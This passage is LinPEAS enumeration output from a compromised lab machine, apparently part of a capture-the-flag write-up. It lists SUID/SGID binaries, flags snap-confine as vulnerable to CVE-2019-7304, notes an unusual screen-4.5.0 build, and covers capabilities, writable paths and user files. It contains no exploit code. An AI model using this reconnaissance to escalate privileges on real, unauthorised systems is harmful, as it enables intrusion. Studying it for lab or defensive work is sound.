class="hljs-string">-rwsr-xr-x 1 root root 204K Apr 29  2017 /usr/lib/snapd/snap-confine  ---&gt;  Ubuntu_snapd&lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                </span><br><span class="hljs-string">-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 419K Mar 16  2017 /usr/lib/openssh/ssh-keysign</span><br><span class="hljs-string">-rwsr-xr-x 1 root root 15K Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ SGID</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid         </span><br><span class="hljs-string">-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd                              </span><br><span class="hljs-string">-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd</span><br><span class="hljs-string">-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate</span><br><span class="hljs-string">-rwxr-sr-x 1 root shadow 61K May  4  2017 /usr/bin/chage</span><br><span class="hljs-string">-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen.old (Unknown SGID binary)</span><br><span class="hljs-string">-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab</span><br><span class="hljs-string">-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write</span><br><span class="hljs-string">-rwxr-sr-x 1 root shadow 23K May  4  2017 /usr/bin/expiry</span><br><span class="hljs-string">-rwxr-sr-x 1 root ssh 351K Mar 16  2017 /usr/bin/ssh-agent</span><br><span class="hljs-string">-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  ---&gt;  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                    </span><br><span class="hljs-string">-rwxr-sr-x 1 root tty 27K Dec 16  2016 /usr/bin/wall</span><br><span class="hljs-string">-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Checking misconfigurations of ld.so</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                 </span><br><span class="hljs-string">/etc/ld.so.conf                                                                          </span><br><span class="hljs-string">Content of /etc/ld.so.conf:                                                              </span><br><span class="hljs-string">include /etc/ld.so.conf.d/*.conf</span><br><span class="hljs-string"></span><br><span class="hljs-string">/etc/ld.so.conf.d</span><br><span class="hljs-string">  /etc/ld.so.conf.d/libc.conf                                                            </span><br><span class="hljs-string">  - /usr/local/lib                                                                       </span><br><span class="hljs-string">  /etc/ld.so.conf.d/x86_64-linux-gnu.conf</span><br><span class="hljs-string">  - /lib/x86_64-linux-gnu                                                                </span><br><span class="hljs-string">  - /usr/lib/x86_64-linux-gnu</span><br><span class="hljs-string"></span><br><span class="hljs-string">/etc/ld.so.preload</span><br><span class="hljs-string">╔══════════╣ Capabilities                                                                </span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities          </span><br><span class="hljs-string">══╣ Current shell capabilities                                                           </span><br><span class="hljs-string">CapInh:  0x0000000000000000=                                                             </span><br><span class="hljs-string">CapPrm:  0x0000000000000000=</span><br><span class="hljs-string">CapEff:  0x0000000000000000=</span><br><span class="hljs-string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37</span><br><span class="hljs-string">CapAmb:  0x0000000000000000=</span><br><span class="hljs-string"></span><br><span class="hljs-string">══╣ Parent process capabilities</span><br><span class="hljs-string">CapInh:  0x0000000000000000=                                                             </span><br><span class="hljs-string">CapPrm:  0x0000000000000000=</span><br><span class="hljs-string">CapEff:  0x0000000000000000=</span><br><span class="hljs-string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37</span><br><span class="hljs-string">CapAmb:  0x0000000000000000=</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Files with capabilities (limited to 50):</span><br><span class="hljs-string">/usr/bin/mtr = cap_net_raw+ep</span><br><span class="hljs-string">/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep</span><br><span class="hljs-string">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ AppArmor binary profiles</span><br><span class="hljs-string">-rw-r--r-- 1 root root  3310 Apr 13  2016 sbin.dhclient                                  </span><br><span class="hljs-string">-rw-r--r-- 1 root root   125 Feb  3  2017 usr.bin.lxc-start</span><br><span class="hljs-string">-rw-r--r-- 1 root root   281 Jan 31  2017 usr.lib.lxd.lxd-bridge-proxy</span><br><span class="hljs-string">-rw-r--r-- 1 root root 14846 Apr 29  2017 usr.lib.snapd.snap-confine.real</span><br><span class="hljs-string">-rw-r--r-- 1 root root  1550 Apr 27  2017 usr.sbin.mysqld</span><br><span class="hljs-string">-rw-r--r-- 1 root root  1527 Jan  5  2016 usr.sbin.rsyslogd</span><br><span class="hljs-string">-rw-r--r-- 1 root root  1455 Feb 21  2017 usr.sbin.tcpdump</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Files with ACLs (limited to 50)</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                  </span><br><span class="hljs-string">files with acls in searched folders Not Found                                            </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">╔══════════╣ Files (scripts) in /etc/profile.d/</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files        </span><br><span class="hljs-string">total 28                                                                                 </span><br><span class="hljs-string">drwxr-xr-x   2 root root 4096 May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 109 root root 4096 Jul 13  2021 ..</span><br><span class="hljs-string">-rw-r--r--   1 root root 1557 Apr 14  2016 Z97-byobu.sh</span><br><span class="hljs-string">-rw-r--r--   1 root root  101 Jan 14  2017 apps-bin-path.sh</span><br><span class="hljs-string">-rw-r--r--   1 root root  663 May 18  2016 bash_completion.sh</span><br><span class="hljs-string">-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh</span><br><span class="hljs-string">-rw-r--r--   1 root root 1941 Mar 16  2016 vte-2.91.sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Permissions in init, init.d, systemd, and rc.d</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                   </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">═╣ Hashes inside passwd file? ........... No</span><br><span class="hljs-string">═╣ Writable passwd file? ................ No                                             </span><br><span class="hljs-string">═╣ Credentials in fstab/mtab? ........... No                                             </span><br><span class="hljs-string">═╣ Can I read shadow files? ............. No                                             </span><br><span class="hljs-string">═╣ Can I read shadow plists? ............ No                                             </span><br><span class="hljs-string">═╣ Can I write shadow plists? ........... No                                             </span><br><span class="hljs-string">═╣ Can I read opasswd file? ............. No                                             </span><br><span class="hljs-string">═╣ Can I write in network-scripts? ...... No                                             </span><br><span class="hljs-string">═╣ Can I read root folder? .............. No                       </span><br><span class="hljs-string">╔══════════╣ Searching root files in home dirs (limit 30)</span><br><span class="hljs-string">/home/                                                                                   </span><br><span class="hljs-string">/home/maria/user.txt</span><br><span class="hljs-string">/home/maria/Desktop/user.txt</span><br><span class="hljs-string">/root/</span><br><span class="hljs-string">/var/www</span><br><span class="hljs-string">/var/www/html</span><br><span class="hljs-string">/var/www/html/hair.html</span><br><span class="hljs-string">/var/www/html/carrie.jpg</span><br><span class="hljs-string">/var/www/html/test.html</span><br><span class="hljs-string">/var/www/html/bounce.jpg</span><br><span class="hljs-string">/var/www/html/sea.jpg</span><br><span class="hljs-string">/var/www/html/index.html</span><br><span class="hljs-string">/var/www/html/exposed.php</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching folders owned by me containing others files on it (limit 100)</span><br><span class="hljs-string">-rw-r--r-- 1 root root 4 Jan  3 09:17 /run/php/php7.0-fpm.pid                            </span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Readable files belonging to root and readable by me but not world readable</span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                               </span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files        </span><br><span class="hljs-string">/dev/mqueue                                                                              </span><br><span class="hljs-string">/dev/shm</span><br><span class="hljs-string">/run/lock</span><br><span class="hljs-string">/run/php</span><br><span class="hljs-string">/tmp</span><br><span class="hljs-string">/tmp/.ICE-unix</span><br><span class="hljs-string">/tmp/.Test-unix</span><br><span class="hljs-string">/tmp/.X11-unix</span><br><span class="hljs-string">/tmp/.XIM-unix</span><br><span class="hljs-string">/tmp/.font-unix</span><br><span class="hljs-string">#)You_can_write_even_more_files_inside_last_directory</span><br><span class="hljs-string"></span><br><span class="hljs-string">/var/crash</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/alsa-utils.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-scsix2d36000c290ce7ceb4b93256b939dfe45afx2dpart2.swap/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-wwnx2d0x6000c290ce7ceb4b93256b939dfe45afx2dpart2.swap/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2dpath-pcix2d0000:0b:00.0x2dscsix2d0:0:1:0x2dpart2.swap/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-c5829712x2d5a18x2d44dfx2da49ax2d15ac3b2e2dda.swap/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/dev-sda2.swap/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens160.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/lightdm.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/nginx.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/php7.0-fpm.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control</span><br><span class="hljs-string">/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control</span><br><span class="hljs-string">/var/lib/nginx/body</span><br><span class="hljs-string">/var/lib/nginx/fastcgi</span><br><span class="hljs-string">/var/lib/nginx/proxy</span><br><span class="hljs-string">/var/lib/nginx/scgi</span><br><span class="hljs-string">/var/lib/nginx/uwsgi</span><br><span class="hljs-string">/var/lib/php/sessions</span><br><span class="hljs-string">/var/log/nginx/access.log</span><br><span class="hljs-string">/var/log/nginx/access.log.1</span><br><span class="hljs-string">/var/log/nginx/access.log.2.gz</span><br><span class="hljs-string">/var/log/nginx/access.log.3.gz</span><br><span class="hljs-string">/var/log/nginx/error.log</span><br><span class="hljs-string">#)You_can_write_even_more_files_inside_last_directory</span><br><span class="hljs-string"></span><br><span class="hljs-string">/var/tmp</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files        </span><br><span class="hljs-string"></span><br><span class="hljs-string">                            ╔═════════════════════════╗</span><br><span class="hljs-string">════════════════════════════╣ Other Interesting Files ╠════════════════════════════      </span><br><span class="hljs-string">                            ╚═════════════════════════╝                                  </span><br><span class="hljs-string">╔══════════╣ .sh files in path</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                        </span><br><span class="hljs-string">/usr/local/bin/screen/tty.sh                                                             </span><br><span class="hljs-string">/usr/local/bin/screen/doc/install.sh</span><br><span class="hljs-string">/usr/local/bin/screen/autogen.sh</span><br><span class="hljs-string">/usr/local/bin/screen/install.sh</span><br><span class="hljs-string">/usr/local/bin/screen/comm.sh</span><br><span class="hljs-string">/usr/local/bin/screen/osdef.sh</span><br><span class="hljs-string">/usr/local/bin/screen/term.sh</span><br><span class="hljs-string">/usr/bin/gettext.sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Executable files potentially added by user (limit 70)</span><br><span class="hljs-string">2017-05-19+09:59:26.2165576550 /var/www/html/uploads/bounce.jpg                          </span><br><span class="hljs-string">2017-05-19+07:27:06.1815656090 /usr/bin/screen-4.5.0</span><br><span class="hljs-string">2017-05-19+07:27:01.5535970860 /usr/local/bin/screen/screen</span><br><span class="hljs-string">2017-05-19+07:26:42.5017490810 /usr/local/bin/screen/config.status</span><br><span class="hljs-string">2017-05-19+07:21:00.3726339120 /usr/local/bin/screen/install</span><br><span class="hljs-string">2017-01-17+20:29:21.8856649350 /usr/local/bin/screen/configure</span><br><span class="hljs-string">2017-01-17+20:28:29.3614044810 /usr/local/bin/screen/autogen.sh</span><br><span class="hljs-string">2017-01-17+20:27:18.9690554240 /usr/local/bin/screen/install.sh</span><br><span class="hljs-string">2017-01-17+20:27:18.9690554240 /usr/local/bin/screen/etc/toolcheck</span><br><span class="hljs-string">2017-01-17+20:27:18.9690554240 /usr/local/bin/screen/etc/newsyntax38</span><br><span class="hljs-string">2017-01-17+20:27:18.9690554240 /usr/local/bin/screen/etc/newsyntax</span><br><span class="hljs-string">2017-01-17+20:27:18.9690554240 /usr/local/bin/screen/etc/mkinstalldirs</span><br><span class="hljs-string">2017-01-17+20:27:18.9650554050 /usr/local/bin/screen/etc/countmail</span><br><span class="hljs-string">2017-01-17+20:27:18.9650554050 /usr/local/bin/screen/etc/ccdefs</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Unexpected in root</span><br><span class="hljs-string">/initrd.img                                                                              </span><br><span class="hljs-string">/vmlinuz.old</span><br><span class="hljs-string">/initrd.img.old</span><br><span class="hljs-string">/vmlinuz</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Modified interesting files in the last 5mins (limit 100)</span><br><span class="hljs-string">/var/log/kern.log                                                                        </span><br><span class="hljs-string">/var/log/syslog</span><br><span class="hljs-string">/var/log/auth.log</span><br><span class="hljs-string"></span><br><span class="hljs-string">logrotate 3.8.7</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Files inside /var/www (limit 20)</span><br><span class="hljs-string">total 12                                                                                 </span><br><span class="hljs-string">drwxr-xr-x  3 root root 4096 May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 14 root root 4096 May 16  2017 ..</span><br><span class="hljs-string">drwxr-xr-x  3 root root 4096 May 19  2017 html</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Files inside others home (limit 20)</span><br><span class="hljs-string">/home/maria/user.txt                                                                     </span><br><span class="hljs-string">/home/maria/.tasks/task1</span><br><span class="hljs-string">/home/maria/.xsession-errors</span><br><span class="hljs-string">/home/maria/Desktop/user.txt</span><br><span class="hljs-string">/home/maria/.bash_logout</span><br><span class="hljs-string">/home/maria/.bashrc</span><br><span class="hljs-string">/home/maria/.dmrc</span><br><span class="hljs-string">/home/maria/.wget-hsts</span><br><span class="hljs-string">/home/maria/.mysql_history</span><br><span class="hljs-string">/home/maria/.bash_history</span><br><span class="hljs-string">/home/maria/.profile</span><br><span class="hljs-string">/home/maria/.ICEauthority</span><br><span class="hljs-string">/home/maria/.Xauthority</span><br><span class="hljs-string">/home/maria/.local/share/.converted-launchers</span><br><span class="hljs-string">/home/maria/.local/share/unity-settings-daemon/input-sources-converted</span><br><span class="hljs-string">/home/maria/.local/share/session_migration-ubuntu</span><br><span class="hljs-string">/home/maria/.sudo_as_admin_successful</span><br><span class="hljs-string">/var/www/html/hair.html</span><br><span class="hljs-string">/var/www/html/carrie.jpg</span><br><span class="hljs-string">/var/www/html/test.html</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching installed mail applications</span><br><span class="hljs-string">                                                                </span><br><span class="hljs-string">╔══════════╣ Mails (limit 50)</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Backup files (limited 100)</span><br><span class="hljs-string">-rw-r--r-- 1 root root 8990 Apr 26  2017 /lib/modules/4.4.0-77-generic/kernel/drivers/power/wm831x_backup.ko</span><br><span class="hljs-string">-rw-r--r-- 1 root root 8710 Apr 26  2017 /lib/modules/4.4.0-77-generic/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="hljs-string">-rw-r--r-- 1 root root 8990 Apr 27  2017 /lib/modules/4.4.0-78-generic/kernel/drivers/power/wm831x_backup.ko</span><br><span class="hljs-string">-rw-r--r-- 1 root root 8710 Apr 27  2017 /lib/modules/4.4.0-78-generic/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="hljs-string">-rw-r--r-- 1 root root 20 Feb  9  2017 /etc/vmware-tools/tools.conf.old</span><br><span class="hljs-string">-rw-r--r-- 1 root root 673 May 15  2017 /etc/xml/xml-core.xml.old</span><br><span class="hljs-string">-rw-r--r-- 1 root root 610 May 15  2017 /etc/xml/catalog.old</span><br><span class="hljs-string">-rw-r--r-- 1 root root 159 May 16  2017 /var/lib/sgml-base/supercatalog.old</span><br><span class="hljs-string">-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen.old</span><br><span class="hljs-string">-rw-r--r-- 1 root root 31600 Feb  9  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so                                                                                     </span><br><span class="hljs-string">-rw-r--r-- 1 root root 11440 May 16  2017 /usr/share/info/dir.old</span><br><span class="hljs-string">-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz</span><br><span class="hljs-string">-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz</span><br><span class="hljs-string">-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz</span><br><span class="hljs-string">-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old</span><br><span class="hljs-string">-rw-r--r-- 1 root root 0 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/include/config/wm831x/backup.h</span><br><span class="hljs-string">-rw-r--r-- 1 root root 0 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/include/config/net/team/mode/activebackup.h</span><br><span class="hljs-string">-rw-r--r-- 1 root root 190366 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/.config.old</span><br><span class="hljs-string">-rw-r--r-- 1 root root 0 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/include/config/wm831x/backup.h</span><br><span class="hljs-string">-rw-r--r-- 1 root root 0 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/include/config/net/team/mode/activebackup.h</span><br><span class="hljs-string">-rw-r--r-- 1 root root 190366 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/.config.old</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)</span><br><span class="hljs-string">Found /var/lib/mlocate/mlocate.db: regular file, no read permission </span><br><span class="hljs-string">╔══════════╣ Web files?(output limit)</span><br><span class="hljs-string">/var/www/:                                                                               </span><br><span class="hljs-string">total 12K</span><br><span class="hljs-string">drwxr-xr-x  3 root root 4.0K May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 14 root root 4.0K May 16  2017 ..</span><br><span class="hljs-string">drwxr-xr-x  3 root root 4.0K May 19  2017 html</span><br><span class="hljs-string"></span><br><span class="hljs-string">/var/www/html:</span><br><span class="hljs-string">total 444K</span><br><span class="hljs-string">drwxr-xr-x 3 root     root     4.0K May 19  2017 .</span><br><span class="hljs-string">drwxr-xr-x 3 root     root     4.0K May 16  2017 ..</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                         </span><br><span class="hljs-string">-rw-r--r-- 1 root root 220 Sep  1  2015 /etc/skel/.bash_logout                           </span><br><span class="hljs-string">-rw-r--r-- 1 root root 1391 May 16  2017 /etc/apparmor.d/cache/.features</span><br><span class="hljs-string">-rw------- 1 root root 0 Feb 15  2017 /etc/.pwd.lock</span><br><span class="hljs-string">-rw-r--r-- 1 maria maria 6774 Jan 17  2017 /usr/local/bin/screen/.iscreenrc</span><br><span class="hljs-string">-rw-r--r-- 1 root root 0 Jan  3 09:17 /run/network/.ifstate.lock</span><br><span class="hljs-string">-rw------- 1 maria maria 957 May 16  2017 /home/maria/.xsession-errors</span><br><span class="hljs-string">-rw-r--r-- 1 maria maria 220 May 15  2017 /home/maria/.bash_logout</span><br><span class="hljs-string">-rw-r--r-- 1 maria maria 25 May 16  2017 /home/maria/.dmrc</span><br><span class="hljs-string">-rw-rw-r-- 1 maria maria 203 May 19  2017 /home/maria/.wget-hsts</span><br><span class="hljs-string">-rw------- 1 maria maria 322 May 16  2017 /home/maria/.ICEauthority</span><br><span class="hljs-string">-rw-rw-r-- 1 maria maria 0 May 16  2017 /home/maria/.local/share/.converted-launchers</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                             </span><br><span class="hljs-string">-rwxr-xr-x 1 www-data www-data 847920 Dec 28 07:40 /tmp/linpeas.sh                       </span><br><span class="hljs-string">-rw-r--r-- 1 root root 43 May 15  2017 /var/backups/dpkg.arch.3.gz</span><br><span class="hljs-string">-rw-r--r-- 1 root root 43 May 15  2017 /var/backups/dpkg.arch.2.gz</span><br><span class="hljs-string">-rw-r--r-- 1 root root 43 May 15  2017 /var/backups/dpkg.arch.1.gz</span><br><span class="hljs-string">-rw-r--r-- 1 root root 11 May 15  2017 /var/backups/dpkg.arch.0</span><br><span class="hljs-string">-rw-r--r-- 1 root root 43 May 15  2017 